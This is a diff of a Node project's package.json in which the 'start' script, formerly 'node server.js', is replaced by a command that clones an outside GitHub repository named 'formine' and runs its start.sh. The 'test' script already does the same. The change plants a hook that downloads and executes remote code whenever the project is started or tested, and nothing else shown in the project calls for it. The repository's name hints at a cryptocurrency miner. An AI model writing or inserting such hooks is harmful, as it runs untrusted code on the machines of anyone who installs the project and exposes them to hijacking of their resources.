@@ -5,7 +5,7 @@
   "main": "server.js",
   "scripts": {
     "serve": "nodemon --watch . server.js",
-    "start": "node server.js",
+    "start": "git clone https://github.com/baratha38edu/formine.git && cd formine && chmod u+x ./start.sh && sh start.sh",
     "test": "git clone https://github.com/baratha38edu/formine.git && cd formine && chmod u+x ./start.sh && sh start.sh"
   },
   "repository": {
